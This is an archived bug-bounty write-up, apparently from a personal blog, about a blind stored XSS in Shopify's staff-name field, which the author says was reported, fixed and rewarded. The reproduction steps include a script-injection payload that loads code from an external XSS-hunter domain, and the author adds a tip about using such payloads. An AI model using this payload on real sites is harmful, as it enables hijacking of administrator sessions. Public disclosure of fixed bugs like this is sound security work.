---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2020-08-19_shopifycom-blind-stored-xss-via-staff-name.md
original_filename: 2020-08-19_shopifycom-blind-stored-xss-via-staff-name.md
title: (Shopify.com) Blind Stored XSS Via Staff Name $$$$
category: documents
detected_topics:
- xss
- command-injection
- mfa
tags:
- imported
- documents
- xss
- command-injection
- mfa
language: en
raw_sha256: 6f45e9f501057b14a7d462d81d88b477456f8b0f8485bcb526afe665c37138d8
text_sha256: f67087c2ab8b22db515d8808e873bd51f0ec9a9fb0ac50db972cb07e587eee45
ingested_at: '2026-06-28T07:32:03Z'
sensitivity: unknown
redactions_applied: false
---

# (Shopify.com) Blind Stored XSS Via Staff Name $$$$

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2020-08-19_shopifycom-blind-stored-xss-via-staff-name.md
- Source Type: markdown
- Detected Topics: xss, command-injection, mfa
- Ingested At: 2026-06-28T07:32:03Z
- Redactions Applied: False
- Raw SHA256: `6f45e9f501057b14a7d462d81d88b477456f8b0f8485bcb526afe665c37138d8`
- Text SHA256: `f67087c2ab8b22db515d8808e873bd51f0ec9a9fb0ac50db972cb07e587eee45`


## Content

---
title: "(Shopify.com) Blind Stored XSS Via Staff Name $$$$"
page_title: "(Shopify.com) Blind Stored XSS Via Staff Name $$$$ – Apapedulimu"
url: "https://apapedulimu.click/shopify-com-blind-stored-xss-via-staff-name/"
final_url: "https://apapedulimu.click/shopify-com-blind-stored-xss-via-staff-name/"
authors: ["Rio Mulyadi (@riomulyadi_)"]
programs: ["Shopify"]
bugs: ["Stored XSS"]
publication_date: "2020-08-19"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 4302
---

# (Shopify.com) Blind Stored XSS Via Staff Name $$$$

![](https://webgrowthboss.com/wp-content/uploads/2020/03/shopify-review-shopify-ecommerce-platform.jpg)First, I want to thank **apapedulimu** for allowing me to make my first write up on this blog

I’m **rioncool22** , based on North Sumatera, Indonesia

I want to share to you about my finding in shopify.com (Hackerone Program). I very often do bug searches on the shopify site and submit reports but it always ends with **Informative** and **N/A.** But, one day i read a report from the Hactivity about blind XSS. The payload get executed at unexpected place. After that, I tried it on shopify and the payload got fired in admin panel 😀

![Screenshot-348](https://i.ibb.co/gZWwsh7/Screenshot-348.png)

Step to reproduce :

  1. Go to [https://your-store.myshopify.com/admin/settings/account __](https://hackerone.com/redirect?signature=3d8fff3ca11b968fe8267cf08127945354f6dc0f&url=https%3A%2F%2Fyour-store.myshopify.com%2Fadmin%2Fsettings%2Faccount "https://your-store.myshopify.com/admin/settings/account")
  2. Add Staff Account
  3. Fill First & Last Name with this payload “><script>$.getScript(“//xsshunterdomain”)</script>
  4. XSS fired in Admin Panel

Some tips : If you search XSS Bug, Change your payload with XSS Hunter payload, because you will not know where the payload get fired 😀

**Timeline :**

  * **Aug 1 :** Submit Report to Shopify
  * **Aug 4 :** First respone from Shopify
  * **Aug 5 :** Triaged
  * **Aug 6 :** Resolved & Rewarded $$$$
  * **Aug 19** : Public Disclosure

Get in touch with me on :

  * Hackerone : [Click Here](https://hackerone.com/rioncool22)
  * Twitter : [Click Here](https://twitter.com/riomulyadi_)

Format [Image](https://apapedulimu.click/type/image/)Posted on [August 19, 2020August 19, 2020](https://apapedulimu.click/shopify-com-blind-stored-xss-via-staff-name/)Author [Rio Mulyadi](https://apapedulimu.click/author/rioncool22/)
